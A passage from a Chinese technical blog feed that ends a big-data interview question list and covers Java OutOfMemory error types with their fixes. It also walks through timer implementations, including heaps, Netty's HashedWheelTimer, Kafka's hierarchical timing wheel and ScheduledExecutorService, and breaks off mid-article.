title="(19)spark的内存管理机制，spark1.6前后对比分析"></a>(19)spark的内存管理机制，spark1.6前后对比分析</h2><h2 id="21-spark-rdd、dataframe、dataset区别"><a href="#21-spark-rdd、dataframe、dataset区别" class="headerlink" title="(21)spark rdd、dataframe、dataset区别"></a>(21)spark rdd、dataframe、dataset区别</h2><p><a href="https://www.cnblogs.com/starwater/p/6841807.html" target="_blank" rel="noopener">https://www.cnblogs.com/starwater/p/6841807.html</a></p><h2 id="22-spark里面有哪些参数可以设置，有什么用"><a href="#22-spark里面有哪些参数可以设置，有什么用" class="headerlink" title="(22)spark里面有哪些参数可以设置，有什么用"></a>(22)spark里面有哪些参数可以设置，有什么用</h2><h2 id="23-hashpartitioner与rangePartitioner的实现"><a href="#23-hashpartitioner与rangePartitioner的实现" class="headerlink" title="(23)hashpartitioner与rangePartitioner的实现"></a>(23)hashpartitioner与rangePartitioner的实现</h2><h2 id="24-spark有哪几种join"><a href="#24-spark有哪几种join" class="headerlink" title="(24)spark有哪几种join"></a>(24)spark有哪几种join</h2><p><a href="https://blog.csdn.net/wisgood/article/details/80106639" target="_blank" rel="noopener">https://blog.csdn.net/wisgood/article/details/80106639</a></p><h2 id="25-spark-jdbc-mysql-读取并发度优化"><a href="#25-spark-jdbc-mysql-读取并发度优化" class="headerlink" title="(25)spark jdbc(mysql)读取并发度优化"></a>(25)spark jdbc(mysql)读取并发度优化</h2><h2 id="26-Spark-join算子可以用什么替代"><a href="#26-Spark-join算子可以用什么替代" class="headerlink" title="(26)Spark join算子可以用什么替代"></a>(26)Spark join算子可以用什么替代</h2><h2 id="27-HBase-region切分后数据是怎么分的"><a href="#27-HBase-region切分后数据是怎么分的" class="headerlink" title="(27)HBase region切分后数据是怎么分的"></a>(27)HBase region切分后数据是怎么分的</h2><h2 id="28-项目集群结构-spark和hadoop集群"><a href="#28-项目集群结构-spark和hadoop集群" class="headerlink" title="(28)项目集群结构(spark和hadoop集群)"></a>(28)项目集群结构(spark和hadoop集群)</h2><h2 id="29-spark-streaming是怎么跟kafka交互的，具体代码怎么写的，程序执行流程是怎样的，这个过程中怎么确保数据不丢-直连和receiver方式"><a href="#29-spark-streaming是怎么跟kafka交互的，具体代码怎么写的，程序执行流程是怎样的，这个过程中怎么确保数据不丢-直连和receiver方式" class="headerlink" title="(29)spark streaming是怎么跟kafka交互的，具体代码怎么写的，程序执行流程是怎样的，这个过程中怎么确保数据不丢(直连和receiver方式)"></a>(29)spark streaming是怎么跟kafka交互的，具体代码怎么写的，程序执行流程是怎样的，这个过程中怎么确保数据不丢(直连和receiver方式)</h2><h2 id="30-kafka如何保证高吞吐的，kafka零拷贝，具体怎么做的"><a href="#30-kafka如何保证高吞吐的，kafka零拷贝，具体怎么做的" class="headerlink" title="(30)kafka如何保证高吞吐的，kafka零拷贝，具体怎么做的"></a>(30)kafka如何保证高吞吐的，kafka零拷贝，具体怎么做的</h2><p><a href="https://www.jianshu.com/p/835ec2d4c170" target="_blank" rel="noopener">https://www.jianshu.com/p/835ec2d4c170</a></p><h2 id="31-hdfs的容错机制"><a href="#31-hdfs的容错机制" class="headerlink" title="(31)hdfs的容错机制"></a>(31)hdfs的容错机制</h2><h2 id="32-zookeeper怎么保证原子性，怎么实现分布式锁"><a href="#32-zookeeper怎么保证原子性，怎么实现分布式锁" class="headerlink" title="(32)zookeeper怎么保证原子性，怎么实现分布式锁"></a>(32)zookeeper怎么保证原子性，怎么实现分布式锁</h2><p><a href="http://www.cnblogs.com/linjiqin/p/6052031.html" target="_blank" rel="noopener">http://www.cnblogs.com/linjiqin/p/6052031.html</a></p><h2 id="33-kafka存储模型与网络模型"><a href="#33-kafka存储模型与网络模型" class="headerlink" title="(33)kafka存储模型与网络模型"></a>(33)kafka存储模型与网络模型</h2><h2 id="34-Zookeeper脑裂问题"><a href="#34-Zookeeper脑裂问题" class="headerlink" title="(34)Zookeeper脑裂问题"></a>(34)Zookeeper脑裂问题</h2><p><a href="https://blog.csdn.net/u010185262/article/details/49910301" target="_blank" rel="noopener">https://blog.csdn.net/u010185262/article/details/49910301</a></p><h2 id="35-Scala"><a href="#35-Scala" class="headerlink" title="(35)Scala"></a>(35)Scala</h2><h3 id="1-隐式转换"><a href="#1-隐式转换" class="headerlink" title="(1)隐式转换"></a>(1)隐式转换</h3><h3 id="2-柯理化"><a href="#2-柯理化" class="headerlink" title="(2)柯理化"></a>(2)柯理化</h3><p>本文转载自:  <a href="https://baijiahao.baidu.com/s?id=1613015315656346729&amp;wfr=spider&amp;for=pc&amp;isFailFlag=1" target="_blank" rel="noopener">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> 面试系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大数据 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一文了解 OutOfMemory 及解决方案</title>
      <link href="/2019/02/01/java/java-xu-ni-ji/yi-wen-liao-jie-outofmemory-ji-jie-jue-fang-an/"/>
      <url>/2019/02/01/java/java-xu-ni-ji/yi-wen-liao-jie-outofmemory-ji-jie-jue-fang-an/</url>
      
        <content type="html"><![CDATA[<h1 id="一文了解-OutOfMemory-及解决方案"><a href="#一文了解-OutOfMemory-及解决方案" class="headerlink" title="一文了解 OutOfMemory 及解决方案"></a>一文了解 OutOfMemory 及解决方案</h1><h3 id="1-Java-堆空间"><a href="#1-Java-堆空间" class="headerlink" title="1. Java 堆空间"></a><strong>1. Java 堆空间</strong></h3><h4 id="发生频率"><a href="#发生频率" class="headerlink" title="发生频率"></a><strong>发生频率</strong></h4><p>5颗星</p><h4 id="造成原因"><a href="#造成原因" class="headerlink" title="造成原因"></a><strong>造成原因</strong></h4><ol><li>无法在 Java 堆中分配对象</li><li>吞吐量增加</li><li>应用程序无意中保存了对象引用，对象无法被 GC 回收</li><li>应用程序过度使用 finalizer。finalizer 对象不能被 GC 立刻回收。finalizer 由结束队列服务的守护线程调用，有时 finalizer 线程的处理能力无法跟上结束队列的增长</li></ol><h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a><strong>解决方案</strong></h4><blockquote><p>单位对应：GB -&gt; G, g；MB -&gt; M, m；KB -&gt; K, k</p></blockquote><ol><li>使用 -Xmx 增加堆大小</li><li>修复应用程序中的内存泄漏</li></ol><h3 id="2-GC-开销超过限制"><a href="#2-GC-开销超过限制" class="headerlink" title="2. GC 开销超过限制"></a><strong>2. GC 开销超过限制</strong></h3><h4 id="发生频率-1"><a href="#发生频率-1" class="headerlink" title="发生频率"></a><strong>发生频率</strong></h4><p>5颗星</p><h4 id="造成原因-1"><a href="#造成原因-1" class="headerlink" title="造成原因"></a><strong>造成原因</strong></h4><ol><li>Java 进程98%的时间在进行垃圾回收，恢复了不到2%的堆空间，最后连续5个（编译时常量）垃圾回收一直如此。 </li></ol><h4 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a><strong>解决方案</strong></h4><ol><li>使用 -Xmx 增加堆大小</li><li>使用 -XX:-UseGCOverheadLimit 取消 GC 开销限制</li><li>修复应用程序中的内存泄漏</li></ol><h3 id="3-请求的数组大小超过虚拟机限制"><a href="#3-请求的数组大小超过虚拟机限制" class="headerlink" title="3. 请求的数组大小超过虚拟机限制"></a><strong>3. 请求的数组大小超过虚拟机限制</strong></h3><h3 id="发生频率-2"><a href="#发生频率-2" class="headerlink" title="发生频率"></a><strong>发生频率</strong></h3><p>2颗星</p><h4 id="造成原因-2"><a href="#造成原因-2" class="headerlink" title="造成原因"></a><strong>造成原因</strong></h4><ol><li>应用程序试图分配一个超过堆大小的数组</li></ol><h4 id="解决方案-2"><a href="#解决方案-2" class="headerlink" title="解决方案"></a><strong>解决方案</strong></h4><ol><li>使用 -Xmx 增加堆大小</li><li>修复应用程序中分配巨大数组的 bug</li></ol><h3 id="4-Permgen-空间"><a href="#4-Permgen-空间" class="headerlink" title="4. Permgen 空间"></a><strong>4. Permgen 空间</strong></h3><h4 id="发生频率-3"><a href="#发生频率-3" class="headerlink" title="发生频率"></a><strong>发生频率</strong></h4><p>3颗星</p><h4 id="造成原因-3"><a href="#造成原因-3" class="headerlink" title="造成原因"></a><strong>造成原因</strong></h4><p>Permgen 空间包含：</p><ul><li>类的名字、字段、方法</li><li>与类相关的对象数组和类型数组</li><li>JIT 编译器优化</li></ul><p>当 Permgen 空间用尽时，将抛出异常。</p><h4 id="解决方案-3"><a href="#解决方案-3" class="headerlink" title="解决方案"></a><strong>解决方案</strong></h4><ol><li>使用 -XX: MaxPermSize 增加 Permgen 大小</li><li>不重启应用部署应用程序可能会导致此问题。重启 JVM 解决</li></ol><h3 id="5-Metaspace"><a href="#5-Metaspace" class="headerlink" title="5. Metaspace"></a><strong>5. Metaspace</strong></h3><h4 id="发生频率-4"><a href="#发生频率-4" class="headerlink" title="发生频率"></a><strong>发生频率</strong></h4><p>3颗星</p><h4 id="造成原因-4"><a href="#造成原因-4" class="headerlink" title="造成原因"></a><strong>造成原因</strong></h4><ol><li>从 Java 8 开始 Permgen 改成了 Metaspace，在本机内存中分配 class 元数据（称为 metaspace）。如果 metaspace 耗尽，则抛出异常</li></ol><h4 id="解决方案-4"><a href="#解决方案-4" class="headerlink" title="解决方案"></a><strong>解决方案</strong></h4><ol><li>通过命令行设置 -XX: MaxMetaSpaceSize 增加 metaspace 大小</li><li>取消 -XX: maxmetsspacedize</li><li>减小 Java 堆大小,为 MetaSpace 提供更多的可用空间</li><li>为服务器分配更多的内存</li><li>可能是应用程序 bug，修复 bug</li></ol><h3 id="6-无法新建本机线程"><a href="#6-无法新建本机线程" class="headerlink" title="6. 无法新建本机线程"></a><strong>6. 无法新建本机线程</strong></h3><h4 id="发生频率-5"><a href="#发生频率-5" class="headerlink" title="发生频率"></a><strong>发生频率</strong></h4><p>5颗星</p><h4 id="造成原因-5"><a href="#造成原因-5" class="headerlink" title="造成原因"></a><strong>造成原因</strong></h4><ol><li>内存不足，无法创建新线程。由于线程在本机内存中创建，报告这个错误表明本机内存空间不足</li></ol><h4 id="解决方案-5"><a href="#解决方案-5" class="headerlink" title="解决方案"></a><strong>解决方案</strong></h4><ol><li><p>为机器分配更多的内存</p></li><li><p>减少 Java 堆空间</p></li><li><p>修复应用程序中的线程泄漏。</p></li><li><p>增加操作系统级别的限制</p></li><li><ul><li>ulimit -a</li><li>用户进程数增大 (-u) 1800</li></ul></li><li><p>使用 -Xss 减小线程堆栈大小</p></li></ol><h3 id="7-杀死进程或子进程"><a href="#7-杀死进程或子进程" class="headerlink" title="7. 杀死进程或子进程"></a><strong>7. 杀死进程或子进程</strong></h3><h4 id="发生频率-6"><a href="#发生频率-6" class="headerlink" title="发生频率"></a><strong>发生频率</strong></h4><p>1颗星</p><h4 id="造成原因-6"><a href="#造成原因-6" class="headerlink" title="造成原因"></a><strong>造成原因</strong></h4><ol><li>内核任务：内存不足结束器，在可用内存极低的情况下会杀死进程</li></ol><h4 id="解决方案-6"><a href="#解决方案-6" class="headerlink" title="解决方案"></a><strong>解决方案</strong></h4><ol><li>将进程迁移到不同的机器上</li><li>给机器增加更多内存</li></ol><p>与其他 OOM 错误不同，这是由操作系统而非 JVM 触发的。</p><h3 id="8-发生-stack-trace-with-native-method"><a href="#8-发生-stack-trace-with-native-method" class="headerlink" title="8. 发生 stack_trace_with_native_method"></a><strong>8. 发生 stack_trace_with_native_method</strong></h3><h4 id="发生频率-7"><a href="#发生频率-7" class="headerlink" title="发生频率"></a><strong>发生频率</strong></h4><p>1颗星</p><h4 id="造成原因-7"><a href="#造成原因-7" class="headerlink" title="造成原因"></a><strong>造成原因</strong></h4><ol><li>本机方法（native method）分配失败</li><li>打印的堆栈跟踪信息，最顶层的帧是本机方法</li></ol><h4 id="解决方案-7"><a href="#解决方案-7" class="headerlink" title="解决方案"></a><strong>解决方案</strong></h4><ol><li>使用操作系统本地工具进行诊断</li></ol>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java虚拟机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>定时器的几种实现方式</title>
      <link href="/2019/01/30/java/ding-shi-qi-de-ji-chong-shi-xian-fang-shi/"/>
      <url>/2019/01/30/java/ding-shi-qi-de-ji-chong-shi-xian-fang-shi/</url>
      
        <content type="html"><![CDATA[<h2 id="定时器的几种实现方式"><a href="#定时器的几种实现方式" class="headerlink" title="定时器的几种实现方式"></a>定时器的几种实现方式</h2><h3 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h3><p>在开始正题之前，先闲聊几句。有人说，计算机科学这个学科，软件方向研究到头就是数学，硬件方向研究到头就是物理，最轻松的是中间这批使用者，可以不太懂物理，不太懂数学，依旧可以使用计算机作为自己谋生的工具。这个规律具有普适应，看看“定时器”这个例子，往应用层研究，有 Quartz，Spring Schedule 等框架；往分布式研究，又有 SchedulerX，ElasticJob 等分布式任务调度；往底层实现看，又有多种定时器实现方案的原理、工作效率、数据结构可以深究…简单上手使用一个框架，并不能体现出个人的水平，如何与他人构成区分度？我觉得至少要在某一个方向有所建树：</p><ol><li>深入研究某个现有框架的实现原理，例如：读源码</li><li>将一个传统技术在分布式领域很好地延伸，很多成熟的传统技术可能在单机 work well，但分布式场景需要很多额外的考虑。</li><li>站在设计者的角度，如果从零开始设计一个轮子，怎么利用合适的算法、数据结构，去实现它。</li></ol><p>回到这篇文章的主题，我首先会围绕第三个话题讨论：设计实现一个定时器，可以使用什么算法，采用什么数据结构。接着再聊聊第一个话题：探讨一些优秀的定时器实现方案。</p><h3 id="2-理解定时器"><a href="#2-理解定时器" class="headerlink" title="2 理解定时器"></a>2 理解定时器</h3><p>很多场景会用到定时器，例如</p><ol><li>使用 TCP 长连接时，客户端需要定时向服务端发送心跳请求。</li><li>财务系统每个月的月末定时生成对账单。</li><li>双 11 的 0 点，定时开启秒杀开关。</li></ol><p>定时器像水和空气一般，普遍存在于各个场景中，一般定时任务的形式表现为：经过固定时间后触发、按照固定频率周期性触发、在某个时刻触发。定时器是什么？可以理解为这样一个数据结构：</p><blockquote><p>存储一系列的任务集合，并且 Deadline 越接近的任务，拥有越高的执行优先级<br>在用户视角支持以下几种操作：<br>NewTask：将新任务加入任务集合<br>Cancel：取消某个任务<br>在任务调度的视角还要支持：<br>Run：执行一个到期的定时任务</p></blockquote><p>判断一个任务是否到期，基本会采用轮询的方式，<strong>每隔一个时间片</strong> 去检查 <strong>最近的任务</strong> 是否到期，并且，在 NewTask 和 Cancel 的行为发生之后，任务调度策略也会出现调整。</p><blockquote><p>说到底，定时器还是靠线程轮询实现的。</p></blockquote><h3 id="3-数据结构"><a href="#3-数据结构" class="headerlink" title="3 数据结构"></a>3 数据结构</h3><p>我们主要衡量 NewTask（新增任务），Cancel（取消任务），Run（执行到期的定时任务）这三个指标，分析他们使用不同数据结构的时间/空间复杂度。</p><h4 id="3-1-双向有序链表"><a href="#3-1-双向有序链表" class="headerlink" title="3.1 双向有序链表"></a>3.1 双向有序链表</h4><p>在 Java 中，<code>LinkedList</code> 是一个天然的双向链表</p><blockquote><p>NewTask：O(N)<br>Cancel：O(1)<br>Run：O(1)<br>N：任务数</p></blockquote><p>NewTask O(N) 很容易理解，按照 expireTime 查找合适的位置即可；Cancel O(1) ，任务在 Cancel 时，会持有自己节点的引用，所以不需要查找其在链表中所在的位置，即可实现当前节点的删除，这也是为什么我们使用双向链表而不是普通链表的原因是 ；Run O(1)，由于整个双向链表是基于 expireTime 有序的，所以调度器只需要轮询第一个任务即可。</p><h4 id="3-2-堆"><a href="#3-2-堆" class="headerlink" title="3.2 堆"></a>3.2 堆</h4><p>在 Java 中，<code>PriorityQueue</code> 是一个天然的堆，可以利用传入的 <code>Comparator</code> 来决定其中元素的优先级。</p><blockquote><p>NewTask：O(logN)<br>Cancel：O(logN)<br>Run：O(1)<br>N：任务数</p></blockquote><p>expireTime 是 <code>Comparator</code> 的对比参数。NewTask O(logN) 和 Cancel O(logN) 分别对应堆插入和删除元素的时间复杂度 ；Run O(1)，由 expireTime 形成的小根堆，我们总能在堆顶找到最快的即将过期的任务。</p><p>堆与双向有序链表相比，NewTask 和 Cancel 形成了 trade off，但考虑到现实中，定时任务取消的场景并不是很多，所以堆实现的定时器要比双向有序链表优秀。</p><h4 id="3-3-时间轮"><a href="#3-3-时间轮" class="headerlink" title="3.3 时间轮"></a>3.3 时间轮</h4><p>Netty 针对 I/O 超时调度的场景进行了优化，实现了 <code>HashedWheelTimer</code> 时间轮算法。</p><p><a href="http://kirito.iocoder.cn/201807171109599678a80c-075a-40ee-b25f-10fd82c1025c.png" target="_blank" rel="noopener"><img src="http://kirito.iocoder.cn/201807171109599678a80c-075a-40ee-b25f-10fd82c1025c.png" alt="时间轮算法"></a>时间轮算法</p><p><code>HashedWheelTimer</code> 是一个环形结构，可以用时钟来类比，钟面上有很多 bucket ，每一个 bucket 上可以存放多个任务，使用一个 List 保存该时刻到期的所有任务，同时一个指针随着时间流逝一格一格转动，并执行对应 bucket 上所有到期的任务。任务通过<code>取模</code>决定应该放入哪个 bucket 。和 HashMap 的原理类似，newTask 对应 put，使用 List 来解决 Hash 冲突。</p><p>以上图为例，假设一个 bucket 是 1 秒，则指针转动一轮表示的时间段为 8s，假设当前指针指向 0，此时需要调度一个 3s 后执行的任务，显然应该加入到 (0+3=3) 的方格中，指针再走 3 次就可以执行了；如果任务要在 10s 后执行，应该等指针走完一轮零 2 格再执行，因此应放入 2，同时将 round（1）保存到任务中。检查到期任务时只执行 round 为 0 的， bucket 上其他任务的 round 减 1。</p><p>再看图中的 bucket5，我们可以知道在 $1<em>8+5=13s$ 后，有两个任务需要执行，在 $2</em>8+5=21s$ 后有一个任务需要执行。</p><blockquote><p>NewTask：O(1)<br>Cancel：O(1)<br>Run：O(M)<br>Tick：O(1)<br>M： bucket ，M ~ N/C ，其中 C 为单轮 bucket 数，Netty 中默认为 512</p></blockquote><p>时间轮算法的复杂度可能表达有误，比较难算，仅供参考。另外，其复杂度还受到多个任务分配到同一个 bucket 的影响。并且多了一个转动指针的开销。</p><blockquote><p>传统定时器是面向任务的，时间轮定时器是面向 bucket 的。</p></blockquote><p>构造 Netty 的 <code>HashedWheelTimer</code> 时有两个重要的参数：<code>tickDuration</code> 和 <code>ticksPerWheel</code>。</p><ol><li><code>tickDuration</code>：即一个 bucket 代表的时间，默认为 100ms，Netty 认为大多数场景下不需要修改这个参数；</li><li><code>ticksPerWheel</code>：一轮含有多少个 bucket ，默认为 512 个，如果任务较多可以增大这个参数，降低任务分配到同一个 bucket 的概率。</li></ol><h4 id="3-4-层级时间轮"><a href="#3-4-层级时间轮" class="headerlink" title="3.4 层级时间轮"></a>3.4 层级时间轮</h4><p>Kafka 针对时间轮算法进行了优化，实现了层级时间轮 <code>TimingWheel</code></p><p>如果任务的时间跨度很大，数量也多，传统的 <code>HashedWheelTimer</code> 会造成任务的 <code>round</code> 很大，单个 bucket 的任务 List 很长，并会维持很长一段时间。这时可将轮盘按时间粒度分级：</p><p><a href="http://kirito.iocoder.cn/7f03c027b1de345a0b1e57239d73de74.png" target="_blank" rel="noopener"><img src="http://kirito.iocoder.cn/7f03c027b1de345a0b1e57239d73de74.png" alt="层级时间轮"></a>层级时间轮</p><p>现在，每个任务除了要维护在当前轮盘的 <code>round</code>，还要计算在所有下级轮盘的<code>round</code>。当本层的<code>round</code>为0时，任务按下级 <code>round</code> 值被下放到下级轮子，最终在最底层的轮盘得到执行。</p><blockquote><p>NewTask：O(H)<br>Cancel：O(H)<br>Run：O(M)<br>Tick：O(1)<br>H：层级数量</p></blockquote><p>设想一下一个定时了 3 天，10 小时，50 分，30 秒的定时任务，在 tickDuration = 1s 的单层时间轮中，需要经过：$3<em>24</em>60<em>60+10</em>60<em>60+50</em>60+30$ 次指针的拨动才能被执行。但在 wheel1 tickDuration = 1 天，wheel2 tickDuration = 1 小时，wheel3 tickDuration = 1 分，wheel4 tickDuration = 1 秒 的四层时间轮中，只需要经过 $3+10+50+30$ 次指针的拨动！</p><p>相比单层时间轮，层级时间轮在时间跨度较大时存在明显的优势。</p><h3 id="4-常见实现"><a href="#4-常见实现" class="headerlink" title="4 常见实现"></a>4 常见实现</h3><h4 id="4-1-Timer"><a href="#4-1-Timer" class="headerlink" title="4.1 Timer"></a>4.1 Timer</h4><p>JDK 中的 <code>Timer</code> 是非常早期的实现，在现在看来，它并不是一个好的设计。</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// 运行一个一秒后执行的定时任务</span>Timer timer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Timer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>timer<span class="token punctuation">.</span><span class="token function">schedule</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">TimerTask</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// do sth</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>使用 <code>Timer</code> 实现任务调度的核心是 <code>Timer</code> 和 <code>TimerTask</code>。其中 <code>Timer</code> 负责设定 <code>TimerTask</code> 的起始与间隔执行时间。使用者只需要创建一个 <code>TimerTask</code> 的继承类，实现自己的 <code>run</code> 方法，然后将其丢给 <code>Timer</code> 去执行即可。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Timer</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> TaskQueue queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TaskQueue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> TimerThread thread <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TimerThread</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>其中 TaskQueue 是使用数组实现的一个简易的堆。另外一个值得注意的属性是 <code>TimerThread</code>，<code>Timer</code> 使用唯一的线程负责轮询并执行任务。<code>Timer</code> 的优点在于简单易用，但也因为所有任务都是由同一个线程来调度，因此整个过程是串行执行的，同一时间只能有一个任务在执行，前一个任务的延迟或异常都将会影响到之后的任务。</p><blockquote><p>轮询时如果发现 currentTime &lt; heapFirst.executionTime，可以 wait(executionTime - currentTime) 来减少不必要的轮询时间。这是普遍被使用的一个优化。</p></blockquote><ol><li><code>Timer</code> 只能被单线程调度</li><li><code>TimerTask</code> 中出现的异常会影响到 <code>Timer</code> 的执行。</li></ol><p>由于这两个缺陷，JDK 1.5 支持了新的定时器方案 <code>ScheduledExecutorService</code>。</p><h4 id="4-2-ScheduledExecutorService"><a href="#4-2-ScheduledExecutorService" class="headerlink" title="4.2 ScheduledExecutorService"></a>4.2 ScheduledExecutorService</h4><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// 运行一个一秒后执行的定时任务</span>ScheduledExecutorService service <span class="token operator">=</span> Executors<span class="token punctuation">.</span><span class="token function">newScheduledThreadPool</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>service<span class="token punctuation">.</span><span class="token function">scheduleA</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Runnable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//do sth</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> TimeUnit<span class="token punctuation">.</span>SECONDS<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>相比 <code>Timer</code>，<code>ScheduledExecutorService</code> 解决了同一个定时器调度多个任务的阻塞问题，并且任务异常不会中断 <code>ScheduledExecutorService</code>。</p><p><code>ScheduledExecutorService</code> 提供了两种常用的周期调度方法 ScheduleAtFixedRate 和 ScheduleWithFixedDelay。</p><p>ScheduleAtFixedRate 每次执行时间为上一次任务开始起向后推一个时间间隔，即每次执行时间为 : $initialDelay$, $initialDelay+period$, $initialDelay+2*period$, …</p><p>ScheduleWithFixedDelay 每次执行时间为上一次任务结束起向后推一个时间间隔，即每次执行时间为：$initialDelay$, $initialDelay+executeTime+delay$, $initialDelay+2<em>executeTime+2</em>delay$, …</p><p>由此可见，ScheduleAtFixedRate 是基于固定时间间隔进行任务调度，ScheduleWithFixedDelay 取决于每次任务执行的时间长短，是基于不固定时间间隔的任务调度。</p><p><code>ScheduledExecutorService</code> 底层使用的数据结构为 <code>PriorityQueue</code>，任务调度方式较为常规，不做特别介绍。</p><h4 id="4-3-HashedWheelTimer"><a href="#4-3-HashedWheelTimer" class="headerlink" title="4.3 HashedWheelTimer"></a>4.3 HashedWheelTimer</h4><pre class=" language-java"><code class="language-java">Timer timer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashedWheelTimer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//等价于 Timer timer = new HashedWheelTimer(100, TimeUnit.MILLISECONDS, 512);</span>timer<span class="token punctuation">.</span><span class="token function">newTimeout</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">TimerTask</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span>Timeout timeout<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//do sth</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> TimeUnit<span class="token punctuation">.</span>SECONDS<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>前面已经介绍过了 Netty 中 <code>HashedWheelTimer</code> 内部的数据结构，默认构造器会配置轮询周期为 100ms，bucket 数量为 512。其使用方法和 JDK 的 <code>Timer</code> 十分相似。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">final</span> Worker worker <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Worker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Runnable</span><span class="token keyword">private</span> <span class="token keyword">final</span> Thread workerThread<span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Thread</span></code></pre><p>由于篇幅限制，我并不打算做详细的源码分析，但上述两行来自 <code>HashedWheelTimer</code> 的代码阐释了一个事实：<code>HashedWheelTimer</code> 内部也同样是使用单个线程进行任务调度。与 JDK 的 <code>Timer</code> 一样，存在”前一个任务执行时间过长，影响后续定时任务执行“的问题。</p><blockquote><p>理解 HashedWheelTimer 中的 ticksPerWheel，tickDuration，对二者进行合理的配置，可以使得用户在合适的场景得到最佳的性能。</p></blockquote><h3 id="5-最佳实践"><a href="#5-最佳实践" class="headerlink" title="5 最佳实践"></a>5 最佳实践</h3><h4 id="5-1-选择合适的定时器"><a href="#5-1-选择合适的定时器" class="headerlink" title="5.1 选择合适的定时器"></a>5.1 选择合适的定时器</h4><p>毋庸置疑，JDK 的 <code>Timer</code> 使用的场景是最窄的，完全可以被后两者取代。如何在 <code>ScheduledExecutorService</code> 和 <code>HashedWheelTimer</code> 之间如何做选择，需要区分场景，做一个简单的对比：</p><ol><li><code>ScheduledExecutorService</code> 是面向任务的，当任务数非常大时，使用堆(PriorityQueue)维护任务的新增、删除会导致性能下降，而 <code>HashedWheelTimer</code> 面向 bucket，设置合理的 ticksPerWheel，tickDuration ，可以不受任务量的限制。所以在任务非常多时，<code>HashedWheelTimer</code> 可以表现出它的优势。</li><li>相反，如果任务量少，<code>HashedWheelTimer</code> 内部的 Worker 线程依旧会不停的拨动指针，虽然不是特别消耗性能，但至少不能说：<code>HashedWheelTimer</code> 一定比 <code>ScheduledExecutorService</code> 优秀。</li><li><code>HashedWheelTimer</code> 由于开辟了一个 bucket 数组，占用的内存会稍大。</li></ol><p>上述的对比，让我们得到了一个最佳实践：在任务非常多时，使用 <code>HashedWheelTimer</code> 可以获得性能的提升。例如服务治理框架中的心跳定时任务，服务实例非常多时，每一个客户端都需要定时发送心跳，每一个服务端都需要定时检测连接状态，这是一个非常适合使用 <code>HashedWheelTimer</code> 的场景。</p><h4 id="5-2-单线程与业务线程池"><a href="#5-2-单线程与业务线程池" class="headerlink" title="5.2 单线程与业务线程池"></a>5.2 单线程与业务线程池</h4><p>我们需要注意<code>HashedWheelTimer</code> 使用单线程来调度任务，如果任务比较耗时，应当设置一个业务线程池，将<code>HashedWheelTimer</code> 当做一个定时触发器，任务的实际执行，交给业务线程池。</p><blockquote><p>如果所有的任务都满足： taskNStartTime - taskN-1StartTime &gt; taskN-1CostTime，即任意两个任务的间隔时间小于先执行任务的执行时间，则无需担心这个问题。</p></blockquote><h4 id="5-3-全局定时器"><a href="#5-3-全局定时器" class="headerlink" title="5.3 全局定时器"></a>5.3 全局定时器</h4><p>实际使用 <code>HashedWheelTimer</code> 